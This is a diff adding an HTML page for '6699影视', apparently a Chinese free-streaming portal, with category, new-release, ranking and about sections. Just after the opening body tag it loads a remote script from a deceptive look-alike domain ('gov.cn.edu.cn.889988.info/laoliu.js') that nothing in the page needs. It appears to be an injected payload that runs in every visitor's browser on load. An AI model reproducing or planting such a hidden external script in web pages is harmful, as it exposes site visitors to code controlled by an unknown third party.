@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>6699影视 - 免费高清影视在线观看 | 6699yingshi-h5.github.io</title>
+<meta name="description" content="6699影视（6699yingshi-h5.github.io）提供最新电影、电视剧、动漫、综艺在线观看，高清流畅，每日更新，完全免费。">
+<meta name="keywords" content="6699影视, 影视在线观看, 免费电影, 电视剧, 动漫, 6699yingshi-h5">
+<meta name="author" content="6699影视">
+<meta name="robots" content="index, follow">
+<style>
+  /* 全局重置 */
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'PingFang SC', 'Microsoft YaHei', system-ui, -apple-system, sans-serif;
+    background: #f4f7fe;
+    color: #333;
+    line-height: 1.6;
+    overflow-x: hidden;
+  }
+  a { text-decoration: none; color: #6c5ce7; transition: color 0.3s ease; }
+  a:hover { color: #fd79a8; }
+  ul { list-style: none; }
+  
+  .container { max-width: 1200px; margin: 0 auto; padding: 0 1.5rem; }
+
+  /* 头部导航 - 玻璃拟态 */
+  .site-header {
+    background: rgba(255, 255, 255, 0.85);
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+    border-bottom: 1px solid rgba(0,0,0,0.05);
+    padding: 1rem 0;
+  }
+  .header-inner {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .logo {
+    font-size: 1.8rem;
+    font-weight: 900;
+    background: linear-gradient(45deg, #6c5ce7, #fd79a8);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .nav-menu { display: flex; gap: 1.5rem; }
+  .nav-menu a {
+    font-weight: 600;
+    color: #555;
+    padding: 0.5rem 0;
+    position: relative;
+  }
+  .nav-menu a::after {
+    content: '';
+    position: absolute;
+    bottom: 0; left: 0; width: 0; height: 2px;
+    background: #6c5ce7;
+    transition: width 0.3s ease;
+  }
+  .nav-menu a:hover::after { width: 100%; }
+
+  /* 栏目1：首页推荐 (Hero) */
+  #home {
+    margin-top: 2rem;
+    background: linear-gradient(135deg, #a8c0ff 0%, #3f2b96 100%);
+    border-radius: 30px;
+    padding: 5rem 2rem;
+    text-align: center;
+    color: #fff;
+    box-shadow: 0 20px 40px rgba(63, 43, 150, 0.25);
+  }
+  #home h1 {
+    font-size: 3rem;
+    margin-bottom: 1rem;
+    text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+  }
+  #home p { font-size: 1.2rem; margin-bottom: 2.5rem; opacity: 0.9; }
+  .search-box {
+    max-width: 600px;
+    margin: 0 auto;
+    display: flex;
+    background: rgba(255,255,255,0.2);
+    backdrop-filter: blur(8px);
+    border-radius: 50px;
+    padding: 0.5rem;
+  }
+  .search-box input {
+    flex: 1;
+    border: none;
+    background: transparent;
+    padding: 1rem 1.5rem;
+    color: #fff;
+    font-size: 1rem;
+    outline: none;
+  }
+  .search-box input::placeholder { color: rgba(255,255,255,0.8); }
+  .search-box button {
+    border: none;
+    background: #fff;
+    color: #6c5ce7;
+    padding: 0 2rem;
+    border-radius: 50px;
+    font-weight: bold;
+    font-size: 1rem;
+    cursor: pointer;
+    transition: transform 0.2s;
+  }
+  .search-box button:hover { transform: scale(1.05); }
+
+  /* 栏目通用 */
+  .section { padding: 4rem 0 2rem; }
+  .section-title {
+    font-size: 2rem;
+    margin-bottom: 2rem;
+    color: #2d3436;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* 栏目2：影视分类 (Grid大色块) */
+  #category .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+    gap: 1.5rem;
+  }
+  .cat-card {
+    background: #fff;
+    border-radius: 20px;
+    padding: 2rem 1rem;
+    text-align: center;
+    box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+    transition: all 0.3s ease;
+    cursor: pointer;
+  }
+  .cat-card:hover {
+    transform: translateY(-10px);
+    box-shadow: 0 15px 30px rgba(108, 92, 231, 0.2);
+  }
+  .cat-icon { font-size: 3rem; margin-bottom: 1rem; display: block; }
+  .cat-card h3 { color: #2d3436; font-size: 1.1rem; }
+
+  /* 栏目3：最新上映 (横向滚动) */
+  #latest .scroll-container {
+    display: flex;
+    gap: 1.5rem;
+    overflow-x: auto;
+    padding-bottom: 1.5rem;
+    scroll-snap-type: x mandatory;
+  }
+  #latest .scroll-container::-webkit-scrollbar { height: 8px; }
+  #latest .scroll-container::-webkit-scrollbar-track { background: #e0e0e0; border-radius: 4px; }
+  #latest .scroll-container::-webkit-scrollbar-thumb { background: #a8c0ff; border-radius: 4px; }
+  
+  .movie-card {
+    flex: 0 0 220px;
+    scroll-snap-align: start;
+    background: #fff;
+    border-radius: 20px;
+    overflow: hidden;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.08);
+  }
+  .movie-poster {
+    height: 300px;
+    background: linear-gradient(45deg, #fd79a8, #fdcb6c);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 5rem;
+    color: rgba(255,255,255,0.5);
+  }
+  .movie-info { padding: 1.2rem; }
+  .movie-info h3 { font-size: 1.1rem; margin-bottom: 0.5rem; color: #2d3436; }
+  .movie-info p { font-size: 0.85rem; color: #636e72; }
+
+  /* 栏目4：排行榜 (大数字列表) */
+  #ranking .rank-list {
+    background: #fff;
+    border-radius: 20px;
+    padding: 2rem;
+    box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+  }
+  .rank-item {
+    display: flex;
+    align-items: center;
+    padding: 1.2rem 0;
+    border-bottom: 1px dashed #eee;
+  }
+  .rank-item:last-child { border-bottom: none; }
+  .rank-num {
+    font-size: 3rem;
+    font-weight: 900;
+    color: #dfe6e9;
+    width: 80px;
+    line-height: 1;
+  }
+  .rank-num.top { color: #fd79a8; }
+  .rank-details { flex: 1; }
+  .rank-details h3 { font-size: 1.2rem; margin-bottom: 0.3rem; color: #2d3436; }
+  .rank-details p { font-size: 0.9rem; color: #636e72; }
+  .rank-score {
+    font-size: 1.2rem;
+    font-weight: bold;
+    color: #6c5ce7;
+    background: #f4f7fe;
+    padding: 0.5rem 1rem;
+    border-radius: 10px;
+  }
+
+  /* 栏目5：关于我们 */
+  #about .about-box {
+    background: #fff;
+    border-radius: 20px;
+    padding: 3rem;
+    text-align: center;
+    box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+  }
+  #about .about-box p {
+    max-width: 800px;
+    margin: 0 auto 1rem;
+    color: #636e72;
+  }
+  #about .url {
+    font-weight: bold;
+    color: #6c5ce7;
+    font-size: 1.1rem;
+    margin-top: 1.5rem;
+    display: inline-block;
+  }
+
+  /* 页脚 */
+  .site-footer {
+    text-align: center;
+    padding: 3rem 1rem;
+    margin-top: 2rem;
+    color: #636e72;
+    font-size: 0.9rem;
+    border-top: 1px solid #dfe6e9;
+  }
+  .site-footer a { color: #6c5ce7; }
+
+  /* 移动端自适应 */
+  @media (max-width: 768px) {
+    .header-inner { flex-direction: column; gap: 1rem; }
+    .nav-menu { flex-wrap: wrap; justify-content: center; gap: 1rem; }
+    #home { padding: 3rem 1.5rem; }
+    #home h1 { font-size: 2.2rem; }
+    .section-title { font-size: 1.6rem; }
+    .movie-card { flex: 0 0 180px; }
+    .movie-poster { height: 240px; }
+    .rank-num { font-size: 2rem; width: 50px; }
+    #about .about-box { padding: 2rem 1rem; }
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+  <!-- 头部 -->
+  <header class="site-header">
+    <div class="container header-inner">
+      <div class="logo">6699影视</div>
+      <nav class="nav-menu">
+        <a href="#home">首页</a>
+        <a href="#category">影视分类</a>
+        <a href="#latest">最新上映</a>
+        <a href="#ranking">热播排行</a>
+        <a href="#about">关于我们</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="container">
+    
+    <!-- 栏目1：首页 -->
+    <section id="home">
+      <h1>6699影视</h1>
+      <p>海量免费高清影视资源，电影、电视剧、动漫、综艺每日更新，手机电脑无缝切换。</p>
+      <div class="search-box">
+        <input type="text" placeholder="搜索你想看的影视名称...">
+        <button type="button">搜 索</button>
+      </div>
+    </section>
+
+    <!-- 栏目2：分类 -->
+    <section id="category" class="section">
+      <h2 class="section-title">📁 影视分类</h2>
+      <div class="grid">
+        <div class="cat-card">
+          <span class="cat-icon">🎬</span>
+          <h3>动作电影</h3>
+        </div>
+        <div class="cat-card">
+          <span class="cat-icon">😂</span>
+          <h3>喜剧搞笑</h3>
+        </div>
+        <div class="cat-card">
+          <span class="cat-icon">📺</span>
+          <h3>国产剧集</h3>
+        </div>
+        <div class="cat-card">
+          <span class="cat-icon">🇺🇸</span>
+          <h3>欧美大片</h3>
+        </div>
+        <div class="cat-card">
+          <span class="cat-icon">🎨</span>
+          <h3>热播动漫</h3>
+        </div>
+        <div class="cat-card">
+          <span class="cat-icon">🎤</span>
+          <h3>综艺娱乐</h3>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目3：最新上映 -->
+    <section id="latest" class="section">
+      <h2 class="section-title">🔥 最新上映</h2>
+      <div class="scroll-container">
+        <article class="movie-card">
+          <div class="movie-poster">🎬</div>
+          <div class="movie-info">
+            <h3>沙丘3：救世主</h3>
+            <p>科幻 / 冒险 | 2026-10-18</p>
+          </div>
+        </article>
+        <article class="movie-card">
+          <div class="movie-poster" style="background: linear-gradient(45deg, #6c5ce7, #a8c0ff);">📺</div>
+          <div class="movie-info">
+            <h3>狂飙2</h3>
+            <p>剧情 / 犯罪 | 更新至24集</p>
+          </div>
+        </article>
+        <article class="movie-card">
+          <div class="movie-poster" style="background: linear-gradient(45deg, #00b894, #55efc4);">🎨</div>
+          <div class="movie-info">
+            <h3>咒术回战 第三季</h3>
+            <p>动漫 / 热血 | 更新至108话</p>
+          </div>
+        </article>
+        <article class="movie-card">
+          <div class="movie-poster" style="background: linear-gradient(45deg, #fdcb6c, #e17055);">🎤</div>
+          <div class="movie-info">
+            <h3>极限挑战 第十季</h3>
+            <p>综艺 / 真人秀 | 更新至12期</p>
+          </div>
+        </article>
+        <article class="movie-card">
+          <div class="movie-poster" style="background: linear-gradient(45deg, #636e72, #2d3436);">🎬</div>
+          <div class="movie-info">
+            <h3>奥本海默2</h3>
+            <p>传记 / 历史 | 正片</p>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- 栏目4：排行榜 -->
+    <section id="ranking" class="section">
+      <h2 class="section-title">🏆 热播排行榜</h2>
+      <div class="rank-list">
+        <div class="rank-item">
+          <span class="rank-num top">1</span>
+          <div class="rank-details">
+            <h3>繁花</h3>
+            <p>国产剧 / 豆瓣高分 / 王家卫执导</p>
+          </div>
+          <span class="rank-score">9.8分</span>
+        </div>
+        <div class="rank-item">
+          <span class="rank-num top">2</span>
+          <div class="rank-details">
+            <h3>庆余年2</h3>
+            <p>古装 / 剧情 / 张若昀主演</p>
+          </div>
+          <span class="rank-score">9.5分</span>
+        </div>
+        <div class="rank-item">
+          <span class="rank-num top">3</span>
+          <div class="rank-details">
+            <h3>周处除三害</h3>
+            <p>动作 / 犯罪 / 中国台湾</p>
+          </div>
+          <span class="rank-score">9.2分</span>
+        </div>
+        <div class="rank-item">
+          <span class="rank-num">4</span>
+          <div class="rank-details">
+            <h3>飞驰人生2</h3>
+            <p>喜剧 / 赛车 / 沈腾主演</p>
+          </div>
+          <span class="rank-score">8.9分</span>
+        </div>
+        <div class="rank-item">
+          <span class="rank-num">5</span>
+          <div class="rank-details">
+            <h3>热辣滚烫</h3>
+            <p>喜剧 / 励志 / 贾玲导演</p>
+          </div>
+          <span class="rank-score">8.7分</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目5：关于 -->
+    <section id="about" class="section">
+      <h2 class="section-title" style="justify-content: center; text-align: center;">ℹ️ 关于 6699影视</h2>
+      <div class="about-box">
+        <p><strong>6699影视</strong>是一个专注于提供免费高清影视在线观看的单页导航网站。我们致力于收集互联网上最新、最热门的电影、电视剧、动漫和综艺节目，为用户提供便捷的观看入口。</p>
+        <p>本站采用全响应式设计，无论您使用手机、平板还是电脑，都能获得最佳的浏览体验。6699影视，做您最忠实的影音伴侣。</p>
+        <div class="url">https://6699yingshi-h5.github.io</div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- 页脚 -->
+  <footer class="site-footer">
+    <p>网站名称：<strong>6699影视</strong></p>
+    <p>官方网址：<a href="https://6699yingshi-h5.github.io">https://6699yingshi-h5.github.io</a></p>
+    <p>© 2026 6699影视 保留所有权利 | 单页演示模板</p>
+  </footer>
+
+  <script>
+    // 平滑滚动
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+          target.scrollIntoView({
+            behavior: 'smooth',
+            block: 'start'
+          });
+        }
+      });
+    });
+
+    // 搜索演示
+    document.querySelector('.search-box button').addEventListener('click', function() {
+      const val = document.querySelector('.search-box input').value;
+      if(val) alert('6699影视搜索演示：' + val);
+    });
+  </script>
+</body>
+</html>
